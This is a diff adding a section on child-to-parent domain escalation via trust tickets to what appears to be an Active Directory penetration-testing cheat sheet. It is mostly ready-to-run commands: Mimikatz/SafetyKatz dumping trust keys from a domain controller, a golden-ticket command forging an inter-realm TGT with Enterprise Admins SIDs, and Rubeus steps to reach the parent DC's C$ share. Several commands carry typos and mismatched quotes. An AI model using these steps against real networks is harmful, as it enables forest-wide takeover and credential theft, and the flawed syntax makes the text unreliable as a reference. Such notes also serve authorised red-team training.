@@ -1,5 +1,66 @@
 # AD - Trust Abuse - Cross-Forest Attacks / MSSQL
 
+## Child to Parent using Trust Tickets
+
+### Description
+
+* sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
+* sIDHistory can be abused in two ways of escalating privileges within a forest: \
+  – krbtgt hash of the child \
+  – Trust tickets
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+**Requirements**
+
+* DA
+* SafetyKatz.exe on DC
+
+**Tool**
+
+**Export Trustkey**
+
+```powershell
+SafetyKatz on DC
+lsadump ::trust /patch'
+
+Domain: dom.local (dom/ S-1-5-2...) 
+[ In ] sub.dom.lcao -> dom.local
+ => Take rc4_hmac_nt  ....
+
+Invoke-Mimikatz -Command '"lsadump ::trust /patch'" -ComputerName dchostname
+or
+Invoke-Mimikatz -Command '"lsadump ::dcsync /user:dom\forest-dc-host$'"
+or
+Invoke-Mimikatz -Command '"lsadump ::lsa /patch'"
+```
+
+**Forge an inter-realm TGT**
+
+{% code overflow="wrap" %}
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberros::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust-key-see-above-cmd /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi" "exit"
+
+Invoke-mimikatz -command '"kerberros::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust--key /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi'"
+```
+{% endcode %}
+
+**Get a TGS for a Service in target domain with the new ticket / then use TGS co access targeted service**
+
+{% code overflow="wrap" %}
+```
+rubeus.exe asktgs /ticket:C:\save-ticket-here.kirbi /service:cifs/forest-dc-hostname.dom.local dc:forest-dc-hostname.dom.local /ptt
+dir \\forest-dc-hostname.dom.local\c$
+
+.\asktgs.exe C:\save-ticket-here.kirbi CIFS/forest-dc-hostname.dom.local
+.\kirbikator.exe lsa .\CIFS/forest-dc-hostname.dom.local
+ls \\forest-dc-hostname.dom.local\c$
+
+```
+{% endcode %}
+
+
+
 ## Bidirectional Forest Trust
 
 ### Description
